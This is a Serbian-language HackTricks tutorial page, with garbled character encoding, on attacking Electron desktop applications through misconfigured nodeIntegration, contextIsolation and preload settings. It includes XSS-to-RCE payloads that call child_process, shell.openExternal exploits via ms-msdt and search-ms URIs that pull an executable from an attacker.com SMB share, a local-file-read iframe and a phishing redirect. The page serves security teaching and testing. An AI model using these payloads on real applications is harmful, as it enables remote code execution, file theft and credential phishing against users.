# Aplikacije za radnu povrÅ¡inu u Electronu

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) je pretraÅ¾ivaÄ pokretan **dark web-om** koji nudi **besplatne** funkcionalnosti za proveru da li je kompanija ili njeni korisnici **kompromitovani** od strane **malvera za kraÄ‘u podataka**.

Njihov primarni cilj WhiteIntela je borba protiv preuzimanja naloga i napada ransomvera koji proizilaze iz malvera za kraÄ‘u informacija.

MoÅ¾ete posetiti njihovu veb lokaciju i isprobati njihovu maÅ¡inu za **besplatno** na:

{% embed url="https://whiteintel.io" %}

***

## Uvod

Electron kombinuje lokalni backend (sa **NodeJS**) i frontend (**Chromium**), iako mu nedostaju neki sigurnosni mehanizmi modernih pregledaÄa.

ObiÄno moÅ¾ete pronaÄ‡i kod elektronske aplikacije unutar `.asar` aplikacije, kako biste dobili kod, morate ga izvuÄ‡i:
```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```
U izvornom kodu Electron aplikacije, unutar `packet.json`, moÅ¾ete pronaÄ‡i specificiran `main.js` fajl gde su postavljene sigurnosne konfiguracije.
```json
{
"name": "standard-notes",
"main": "./app/index.js",
```
Electron ima 2 tipa procesa:

* Glavni proces (ima potpuni pristup NodeJS-u)
* Proces renderer-a (treba imati ograniÄen pristup NodeJS-u iz sigurnosnih razloga)

![](<../../../.gitbook/assets/image (182).png>)

Proces renderer-a Ä‡e biti prozor pregledaÄa koji uÄitava datoteku:
```javascript
const {BrowserWindow} = require('electron');
let win = new BrowserWindow();

//Open Renderer Process
win.loadURL(`file://path/to/index.html`);
```
PodeÅ¡avanja **renderer procesa** mogu se **konfigurisati** u **glavnom procesu** unutar fajla main.js. Neke od konfiguracija Ä‡e **sprijeÄiti Electron aplikaciju da bude izloÅ¾ena RCE** ili drugim ranjivostima ako su **podeÅ¡avanja ispravno konfigurisana**.

Elektronska aplikacija **moÅ¾e pristupiti ureÄ‘aju** putem Node API-ja iako se moÅ¾e konfigurisati da to sprijeÄi:

* **`nodeIntegration`** - je podrazumijevano iskljuÄen. Ako je ukljuÄen, omoguÄ‡ava pristup node funkcijama iz renderer procesa.
* **`contextIsolation`** - je podrazumijevano ukljuÄen. Ako je iskljuÄen, glavni i renderer procesi nisu izolovani.
* **`preload`** - podrazumijevano prazan.
* [**`sandbox`**](https://docs.w3cub.com/electron/api/sandbox-option) - je podrazumijevano iskljuÄen. OgraniÄava akcije koje NodeJS moÅ¾e izvrÅ¡iti.
* Node Integracija u Radnicima
* **`nodeIntegrationInSubframes`** - je podrazumijevano iskljuÄen.
* Ako je **`nodeIntegration`** **omoguÄ‡en**, to bi omoguÄ‡ilo koriÅ¡Ä‡enje **Node.js API-ja** na web stranicama koje se **uÄitavaju u iframe-ovima** unutar Electron aplikacije.
* Ako je **`nodeIntegration`** **onemoguÄ‡en**, tada Ä‡e se prelodi uÄitati u iframe-u

Primer konfiguracije:
```javascript
const mainWindowOptions = {
title: 'Discord',
backgroundColor: getBackgroundColor(),
width: DEFAULT_WIDTH,
height: DEFAULT_HEIGHT,
minWidth: MIN_WIDTH,
minHeight: MIN_HEIGHT,
transparent: false,
frame: false,
resizable: true,
show: isVisible,
webPreferences: {
blinkFeatures: 'EnumerateDevices,AudioOutputDevices',
nodeIntegration: false,
contextIsolation: false,
sandbox: false,
nodeIntegrationInSubFrames: false,
preload: _path2.default.join(__dirname, 'mainScreenPreload.js'),
nativeWindowOpen: true,
enableRemoteModule: false,
spellcheck: true
}
};
```
Neki **RCE payloadi** sa [ovde](https://7as.es/electron/nodeIntegration\_rce.txt):
```html
Example Payloads (Windows):
<img src=x onerror="alert(require('child_process').execSync('calc').toString());">

Example Payloads (Linux & MacOS):
<img src=x onerror="alert(require('child_process').execSync('gnome-calculator').toString());">
<img src=x onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());">
<img src=x onerror="alert(require('child_process').execSync('id').toString());">
<img src=x onerror="alert(require('child_process').execSync('ls -l').toString());">
<img src=x onerror="alert(require('child_process').execSync('uname -a').toString());">
```
### Snimanje saobraÄ‡aja

Izmenite konfiguraciju start-main i dodajte koriÅ¡Ä‡enje proxy-ja kao Å¡to je:
```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```
## Elektron lokalna ubacivanje koda

Ako moÅ¾ete lokalno izvrÅ¡iti Elektron aplikaciju, moguÄ‡e je da moÅ¾ete naterati da izvrÅ¡i proizvoljan JavaScript kod. Proverite kako u:

{% content-ref url="../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md" %}
[macos-electron-applications-injection.md](../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md)
{% endcontent-ref %}

## RCE: XSS + nodeIntegration

Ako je **nodeIntegration** podeÅ¡en na **on**, JavaScript veb stranice mogu lako koristiti Node.js funkcije jednostavno pozivajuÄ‡i `require()`. Na primer, naÄin za izvrÅ¡avanje aplikacije kalkulatora na Windows-u je:
```html
<script>
require('child_process').exec('calc');
// or
top.require('child_process').exec('open /System/Applications/Calculator.app');
</script>
```
<figure><img src="../../../.gitbook/assets/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

Skripta naznaÄena u ovom podeÅ¡avanju se **uÄitava pre drugih skripti u rendereru**, tako da ima **neograniÄen pristup Node API-ima**:
```javascript
new BrowserWindow{
webPreferences: {
nodeIntegration: false,
preload: _path2.default.join(__dirname, 'perload.js'),
}
});
```
Dakle, skripta moÅ¾e izvoziti node-features na stranice:

{% code title="preload.js" %}
```javascript
typeof require === 'function';
window.runCalc = function(){
require('child_process').exec('calc')
};
```
{% endcode %}

{% code title="index.html" %}
```html
<body>
<script>
typeof require === 'undefined';
runCalc();
</script>
</body>
```
{% endcode %}

{% hint style="info" %}
**Ako je `contextIsolation` ukljuÄen, ovo neÄ‡e raditi**
{% endhint %}

## RCE: XSS + contextIsolation

_**contextIsolation**_ uvodi **odvojene kontekste izmeÄ‘u skripti veb stranice i unutraÅ¡njeg koda JavaScript-a Elektron** tako da izvrÅ¡avanje JavaScript-a svakog koda ne utiÄe jedan na drugi. Ovo je neophodna funkcija za eliminisanje moguÄ‡nosti RCE.

Ako konteksti nisu izolovani, napadaÄ moÅ¾e:

1. IzvrÅ¡iti **proizvoljan JavaScript u rendereru** (XSS ili navigacija ka spoljnim sajtovima)
2. **Prepisati ugraÄ‘enu metodu** koja se koristi u preload ili unutraÅ¡njem kodu Elektrona u sopstvenu funkciju
3. **Pokrenuti** koriÅ¡Ä‡enje **prepisane funkcije**
4. RCE?

Postoje 2 mesta gde se ugraÄ‘ene metode mogu prepisati: U preload kodu ili u unutraÅ¡njem kodu Elektrona:

{% content-ref url="electron-contextisolation-rce-via-preload-code.md" %}
[electron-contextisolation-rce-via-preload-code.md](electron-contextisolation-rce-via-preload-code.md)
{% endcontent-ref %}

{% content-ref url="electron-contextisolation-rce-via-electron-internal-code.md" %}
[electron-contextisolation-rce-via-electron-internal-code.md](electron-contextisolation-rce-via-electron-internal-code.md)
{% endcontent-ref %}

{% content-ref url="electron-contextisolation-rce-via-ipc.md" %}
[electron-contextisolation-rce-via-ipc.md](electron-contextisolation-rce-via-ipc.md)
{% endcontent-ref %}

### ZaobiÄ‘ite dogaÄ‘aj klika

Ako postoje ograniÄenja primenjena kada kliknete na link, moÅ¾da Ä‡ete moÄ‡i da ih zaobiÄ‘ete **praveÄ‡i srednji klik** umesto redovnog levog klika
```javascript
window.addEventListener('click', (e) => {
```
## RCE putem shell.openExternal

Za viÅ¡e informacija o ovim primerima proverite [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) i [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)

Prilikom implementacije Electron desktop aplikacije, vaÅ¾no je osigurati ispravne postavke za `nodeIntegration` i `contextIsolation`. UtvrÄ‘eno je da se **udaljeno izvrÅ¡avanje koda na klijentskoj strani (RCE)** koje cilja preload skripte ili Electron-ov nativni kod iz glavnog procesa efikasno spreÄava kada su ove postavke na mestu.

Kada korisnik interaguje sa linkovima ili otvara nove prozore, specifiÄni event listeneri se aktiviraju, Å¡to je kljuÄno za sigurnost i funkcionalnost aplikacije:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```
Ovi sluÅ¡aoci **su preklopljeni od strane desktop aplikacije** kako bi implementirali svoju **poslovnu logiku**. Aplikacija procenjuje da li bi navigirani link trebalo da se otvori interno ili u eksternom web pregledaÄu. Ova odluka se obiÄno donosi kroz funkciju, `openInternally`. Ako ova funkcija vrati `false`, to ukazuje da link treba da se otvori eksterno, koristeÄ‡i funkciju `shell.openExternal`.

**Evo pojednostavljenog pseudokoda:**

![https://miro.medium.com/max/1400/1\*iqX26DMEr9RF7nMC1ANMAA.png](<../../../.gitbook/assets/image (261).png>)

![https://miro.medium.com/max/1400/1\*ZfgVwT3X1V\_UfjcKaAccag.png](<../../../.gitbook/assets/image (963).png>)

Najbolje prakse za bezbednost u Electron JS-u savetuju da se ne prihvata nepoveren sadrÅ¾aj sa funkcijom `openExternal`, jer to moÅ¾e dovesti do RCE putem razliÄitih protokola. Operativni sistemi podrÅ¾avaju razliÄite protokole koji mogu pokrenuti RCE. Za detaljne primere i dalje objaÅ¡njenje o ovoj temi, moÅ¾ete se obratiti [ovom resursu](https://positive.security/blog/url-open-rce#windows-10-19042), koji ukljuÄuje primere Windows protokola koji su sposobni da iskoriste ovu ranjivost.

**Primeri eksploatacije Windows protokola ukljuÄuju:**
```html
<script>
window.open("ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22")
</script>

<script>
window.open("search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update")
</script>

<script>
window.open("ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D")
</script>
```
## ÄŒitanje internih fajlova: XSS + contextIsolation

OnemoguÄ‡avanje `contextIsolation` omoguÄ‡ava koriÅ¡Ä‡enje oznaka `<webview>`, sliÄno kao `<iframe>`, za Äitanje i eksfiltraciju lokalnih fajlova. Primer prikazuje kako iskoristiti ovu ranjivost za Äitanje sadrÅ¾aja internih fajlova:

![](<../../../.gitbook/assets/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

TakoÄ‘e, deli se joÅ¡ jedan metod za **Äitanje internog fajla**, istiÄuÄ‡i kritiÄnu ranjivost Äitanja lokalnih fajlova u Electron desktop aplikaciji. To ukljuÄuje ubacivanje skripte za iskoriÅ¡Ä‡avanje aplikacije i eksfiltraciju podataka:
```html
<br><BR><BR><BR>
<h1>pwn<br>
<iframe onload=j() src="/etc/hosts">xssxsxxsxs</iframe>
<script type="text/javascript">
function j(){alert('pwned contents of /etc/hosts :\n\n '+frames[0].document.body.innerText)}
</script>
```
## **RCE: XSS + Stari Chromium**

Ako je **chromium** koji koristi aplikacija **zastareo** i postoje **poznate** **ranjivosti** na njemu, moguÄ‡e je **iskoristiti ih i dobiti RCE putem XSS**.\
MoÅ¾ete videti primer u ovom **izveÅ¡taju**: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)

## **XSS Ribarenje putem Internog URL regex zaobilaÅ¾enja**

Pretpostavimo da ste pronaÅ¡li XSS ali ne moÅ¾ete da pokrenete RCE ili ukradete interne datoteke, moÅ¾ete pokuÅ¡ati da ga iskoristite za **ukradete pristupne podatke putem ribarenja**.

Prvo treba da znate Å¡ta se deÅ¡ava kada pokuÅ¡ate da otvorite novi URL, proveravajuÄ‡i JS kod u front-endu:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```
Poziv **`openInternally`** Ä‡e odluÄiti da li Ä‡e se **link** otvoriti u **prozoru desktopa** jer je to link koji pripada platformi, **ili** Ä‡e se otvoriti u **pregledaÄu kao resurs treÄ‡e strane**.

U sluÄaju da je **regex** koji koristi funkcija **ranjiv na obilaske** (na primer, **ne beÅ¾eÄ‡i taÄke poddomena**), napadaÄ bi mogao zloupotrebiti XSS da **otvori novi prozor koji** Ä‡e se nalaziti na infrastrukturi napadaÄa **traÅ¾eÄ‡i od korisnika pristupne podatke**:
```html
<script>
window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```
## **Alati**

* [**Electronegativity**](https://github.com/doyensec/electronegativity) je alat za identifikaciju loÅ¡e konfigurisanih segmenata i sigurnosnih anti-uzoraka u aplikacijama zasnovanim na Electron-u.
* [**Electrolint**](https://github.com/ksdmitrieva/electrolint) je otvoreni VS Code dodatak za Electron aplikacije koji koristi Electronegativity.
* [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) za proveru ranjivih biblioteka treÄ‡ih strana
* [**Electro.ng**](https://electro.ng/): Morate da ga kupite

## Laboratorije

Na [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s) moÅ¾ete pronaÄ‡i laboratoriju za iskoriÅ¡Ä‡avanje ranjivih Electron aplikacija.

Neki korisni komandi za pomoÄ‡ u laboratoriji:
```bash
# Download apps from these URls
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vuln to IPC Rce
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```
## **Reference**

* [https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
* [https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
* [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
* [https://www.youtube.com/watch?v=a-YnG3Mx-Tg](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
* [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s)
* ViÅ¡e istraÅ¾ivanja i tekstova o sigurnosti Elektron aplikacija moÅ¾ete pronaÄ‡i na [https://github.com/doyensec/awesome-electronjs-hacking](https://github.com/doyensec/awesome-electronjs-hacking)
* [https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81](https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81)

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) je pretraÅ¾ivaÄ pokrenut na **dark webu** koji nudi **besplatne** funkcionalnosti za proveru da li je kompanija ili njeni korisnici **kompromitovani** od strane **malvera za kraÄ‘u podataka**.

Primarni cilj WhiteIntela je borba protiv preuzimanja naloga i napada ransomware-a koji proizilaze iz malvera za kraÄ‘u informacija.

MoÅ¾ete posetiti njihovu veb lokaciju i isprobati njihovu maÅ¡inu za **besplatno** na:

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA ÄŒLANSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
